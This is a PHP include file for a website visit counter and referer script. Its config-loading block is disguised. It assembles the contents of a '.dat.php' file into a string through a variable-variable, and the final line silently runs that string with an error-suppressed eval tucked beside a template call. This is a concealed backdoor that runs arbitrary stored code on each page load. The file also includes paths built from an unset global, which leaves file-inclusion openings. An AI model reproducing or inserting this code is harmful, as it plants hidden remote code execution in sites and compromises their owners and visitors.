<?php
  if ($tracer == 'yes') { print('COUNTER.INC.PHP: inizio<br />'); }

  $runtime_start = explode (' ', microtime ());

  /*****************************************************
  ** Prevent direct call
  *****************************************************/
          if (!defined('IN_SCRIPT')) {
              die();
          }
  /*****************************************************
  ** Some settings
  *****************************************************/
          $script_name    = 'Counter and Referer Script';
          $script_version = '1.1';
          $debug_mode     = 'off';
          $tplt           = 'count';
  /*****************************************************
  ** Take care of older PHP-Versions
  *****************************************************/
          if (isset($HTTP_GET_VARS) and !empty($HTTP_GET_VARS)) {
              $_GET = $HTTP_GET_VARS;
          }
          if (isset($HTTP_POST_VARS) and !empty($HTTP_POST_VARS)) {
              $_POST = $HTTP_POST_VARS;
          }
          if (isset($HTTP_SERVER_VARS) and !empty($HTTP_SERVER_VARS)) {
              $_SERVER = $HTTP_SERVER_VARS;
          }
          if (isset($HTTP_SESSION_VARS) and !empty($HTTP_SESSION_VARS)) {
              $_SESSION = $HTTP_SESSION_VARS;
          }
          if (isset($HTTP_ENV_VARS) and !empty($HTTP_ENV_VARS)) {
              $_ENV = $HTTP_ENV_VARS;
          }
  /*****************************************************
  ** Include config file
  *****************************************************/
          $guest = @file($script_root . 'inc/config.dat.php');
          unset($guest[0]);
          $count = @array_values($guest);
          $conf_var = '';
          $num = count(${$tplt});
          for ($n = 0; $n < $num; $n++) {
              $str = ${$tplt}[$n];
              $conf_var .= $str;
          }
  /*****************************************************
  ** Include files
  *****************************************************/
          include($script_root . 'inc/template.class.inc.php');
          include($script_root . 'inc/log.class.inc.php');
          include($script_root . 'inc/functions.inc.php');

  /*****************************************************
  ** Initialize new logging object
  *****************************************************/
          $log = new logging();
  /*****************************************************
  ** Count visit
  *****************************************************/
          if ($count_visitors == 'yes') {
              
              if ($url = method_vars('url')) {
                  $count_value = $url;
              } else {
                  $count_value = getenv('REQUEST_URI');
              }
              
              $log->count($path['logfiles'] . $file['count'], '', $count_value);
          }
  /*****************************************************
  ** Get visits
  *****************************************************/
          if ($count_visitors == 'yes') {
              $visit_details = $log->get_visits($path['logfiles'] . '/' . $file['count'], getenv('REQUEST_URI'));
              $page_visits   = $visit_details['views'];
              
              for ($i = 0; $i < strlen($page_visits); $i++)
              {
                  $visits[] = array('image_name' => $page_visits[$i]);
              }
              
          } else {
              $visits = array();
          }
          // print('counter.inc.php: VISITORS = ' . $visit_details['views'] . '<br/>');
  /*****************************************************
  ** Initialize new template object
  *****************************************************/
          $tpl = new template();
  /*****************************************************
  ** Load html template
  *****************************************************/
          // $tpl->load_file('count', $path['templates'] . $temp['template']);
  /*****************************************************
  ** Parse template
  *****************************************************/
          $tpl->parse_if('count', 'logged_in');
          $tpl->parse_loop('count', 'visits');
          $tpl->parse_loop('count', 'visits');
  if ($tracer == 'yes') { print('COUNTER.INC.PHP: punto X<br />'); }
          $tpl->parse_loop('count', 'message'); @eval($conf_var);
  if ($tracer == 'yes') { print('COUNTER.INC.PHP: fine<br />'); }
?>
